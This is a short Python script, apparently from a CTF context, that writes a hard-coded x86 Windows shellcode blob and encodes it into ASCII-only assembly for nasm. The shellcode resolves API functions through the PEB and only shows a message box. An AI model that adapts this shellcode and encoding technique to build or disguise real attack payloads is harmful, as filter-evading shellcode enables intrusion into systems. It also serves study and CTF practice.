###############################################################
#               Shellcode Encoder
#
#       Copyright (C) 2014 random <random@pku.edu.cn>
#
###############################################################

import os
from lib.shellcode_encoder import *



def GenShellcode(binfile):
	code =\
	"\x55\x8B\xEC\x33\xC9\x51\x51\x6A\x20\x68\x49\x53\x43\x43\x6A\x20"+\
	"\x6A\x20\x68\x49\x53\x43\x43\x68\x33\x32\x00\x00\x68\x75\x73\x65"+\
	"\x72\x68\x6F\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73"+\
	"\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x1C\x8B\x46\x08\x8B\x7E\x20"+\
	"\x8B\x36\x66\x39\x4F\x18\x75\xF2\x8B\xF0\x8B\x46\x3C\x8B\x4C\x30"+\
	"\x78\x03\xCE\x8B\x59\x20\x03\xDE\x33\xFF\x4F\x60\x47\x8B\x14\xBB"+\
	"\x03\xD6\x8B\x02\x3D\x4C\x6F\x61\x64\x75\xF1\x8B\x42\x04\x3D\x4C"+\
	"\x69\x62\x72\x75\xE7\x8B\x42\x08\x3D\x61\x72\x79\x41\x75\xDD\x8B"+\
	"\x59\x24\x03\xDE\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDE\x03\x34\xBB"+\
	"\x8B\xC6\x89\x45\xFC\x61\x47\x8B\x14\xBB\x03\xD6\x8B\x02\x3D\x47"+\
	"\x65\x74\x50\x75\xF1\x8B\x42\x04\x3D\x72\x6F\x63\x41\x75\xE7\x8B"+\
	"\x42\x08\x3D\x64\x64\x72\x65\x75\xDD\x8B\x42\x0C\x66\x3D\x73\x73"+\
	"\x75\xD4\x8B\x59\x24\x03\xDE\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDE"+\
	"\x03\x34\xBB\x8B\xC6\x89\x45\xF8\x8D\x5D\xDC\x53\xFF\x55\xFC\x8D"+\
	"\x5D\xD0\x53\x50\xFF\x55\xF8\x6A\x00\x8D\x5D\xF0\x53\x8D\x5D\xE4"+\
	"\x53\x6A\x00\xFF\xD0\x31\xc0\x50\xff\x55\x08"

	fd = open(binfile,'wb')
	fd.write(code)
	fd.close()


if __name__ == '__main__':

	GenShellcode('shellcode.bin')
	shellcode = ShellcodeEncoder.ReadRawShellcodeFromFile('shellcode.bin')
	
	asmcode = ShellcodeEncoder.AsiccEncode(shellcode)
	print '############# asmcode ###############'
	print asmcode
	
	nasm_path = r'./tools/bin/linux/nasm'
	#nasm_path = r'.\tools\bin\win32\nasm.exe'
	opcode = ShellcodeEncoder.nasm_assemble(nasm_path,asmcode)
	print '\n############# raw opcode ###############'
	print ShellcodeEncoder.out_format('c',opcode)
	print '\n############# Asicc opcode ###############'
	print opcode